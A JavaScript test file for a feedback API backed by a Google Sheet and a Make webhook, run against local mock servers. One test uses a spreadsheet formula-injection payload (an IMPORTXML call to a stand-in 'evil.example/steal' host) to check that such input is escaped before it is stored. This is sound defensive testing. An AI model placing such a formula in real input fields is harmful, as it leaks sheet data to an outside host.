'use strict';
// The API tests with a Google Sheet as database and new feedback sent to a Make webhook (which adds the row).
const test = require('node:test');
const assert = require('node:assert/strict');
const { createMockGoogle } = require('./mock-google');
const mock = createMockGoogle();

process.env.ADMIN_PASSWORD = 'test-pass-123';
process.env.PUBLIC_CACHE_SECONDS = '0';
process.env.SHEET_CACHE_SECONDS = '0';
process.env.GOOGLE_SHEET_ID = 'SHEET123';
delete process.env.VERCEL;
const { createServer } = require('../dev-server');
const { registerTests } = require('./shared');

let server, google, base, g;
test.before(async () => {
  google = mock.server;
  await new Promise(r => google.listen(0, r));
  g = 'http://localhost:' + google.address().port;
  process.env.GOOGLE_TOKEN_URL = g + '/token';
  process.env.GOOGLE_SHEETS_API = g + '/v4';
  process.env.MAKE_WEBHOOK_URL = g + '/hook';
  process.env.GOOGLE_SERVICE_ACCOUNT_JSON = Buffer.from(JSON.stringify(mock.account)).toString('base64');   // base64 form works too
  server = createServer();
  await new Promise(r => server.listen(0, r));
  base = 'http://localhost:' + server.address().port;
});
test.after(() => { server.close(); google.close(); });
registerTests(() => base);

const post = (body, ip) => fetch(base + '/api/feedback', { method: 'POST', headers: { 'Content-Type': 'application/json', 'x-real-ip': ip || '7.7.7.' + Math.floor(Math.random() * 250) }, body: JSON.stringify(body) });

test('make: the webhook receives one JSON object whose fields match the sheet columns', async () => {
  const p = mock.state.makePayloads[0];
  assert.deepEqual(Object.keys(p), ['id', 'createdAt', 'date', 'anonymous', 'name', 'title', 'content', 'hidden', 'edited', 'updatedAt']);
  assert.match(p.id, /^f[a-f0-9]{11}$/);
  assert.equal(typeof p.createdAt, 'number');
  assert.equal(typeof p.anonymous, 'boolean');
  const sent = new Set(mock.state.makePayloads.map(x => x.id));
  assert.ok(mock.state.rows.slice(1).every(row => sent.has(row[0])), 'every row in the sheet came through Make');
});

test('make: text that could be a formula is sent protected and no formula ever reaches the sheet', async () => {
  const evil = '=IMPORTXML("http://evil.example/steal","//a")';
  assert.equal((await post({ title: '@everyone look', content: evil + ' please' })).status, 201);
  const payload = mock.state.makePayloads.at(-1);
  assert.equal(payload.title, "'@everyone look");
  assert.ok(payload.content.startsWith("'="));
  assert.equal(mock.state.formulaCells, 0, 'no cell became a formula');
  const item = (await (await fetch(base + '/api/feedback')).json()).items.find(i => i.title === '@everyone look');
  assert.equal(item.content, evil + ' please');
});

test('make: if Make is down the player gets an error (and nothing is lost silently)', async () => {
  const keep = process.env.MAKE_WEBHOOK_URL;
  process.env.MAKE_WEBHOOK_URL = 'http://127.0.0.1:1/hook';
  const res = await post({ title: 'Will fail', content: 'Make cannot be reached.' });
  process.env.MAKE_WEBHOOK_URL = keep;
  assert.equal(res.status, 503);
  assert.match((await res.json()).error, /not reachable/);
});

test('make: Make adds the row a little later - it shows up on the site once it is in the sheet', async () => {
  const slow = createMockGoogle({ makeDelayMs: 400 });
  await new Promise(r => slow.server.listen(0, r));
  const url = 'http://localhost:' + slow.server.address().port;
  const keep = { api: process.env.GOOGLE_SHEETS_API, token: process.env.GOOGLE_TOKEN_URL, hook: process.env.MAKE_WEBHOOK_URL, json: process.env.GOOGLE_SERVICE_ACCOUNT_JSON };
  // point the running site at the slow mock (settings are read on every request, but the token / store are reused)
  process.env.GOOGLE_SHEETS_API = url + '/v4'; process.env.GOOGLE_TOKEN_URL = url + '/token'; process.env.MAKE_WEBHOOK_URL = url + '/hook';
  process.env.GOOGLE_SERVICE_ACCOUNT_JSON = JSON.stringify(slow.account);
  try {
    const res = await post({ title: 'Slow Make', content: 'Make writes this row after a short delay.' });
    assert.equal(res.status, 201);
    let list = await (await fetch(base + '/api/feedback')).json();
    assert.ok(!list.items.some(i => i.title === 'Slow Make'), 'not visible before Make wrote it');
    await new Promise(r => setTimeout(r, 700));
    list = await (await fetch(base + '/api/feedback')).json();
    assert.ok(list.items.some(i => i.title === 'Slow Make'), 'visible after Make wrote it');
  } finally {
    Object.assign(process.env, { GOOGLE_SHEETS_API: keep.api, GOOGLE_TOKEN_URL: keep.token, MAKE_WEBHOOK_URL: keep.hook, GOOGLE_SERVICE_ACCOUNT_JSON: keep.json });
    slow.server.close();
  }
});
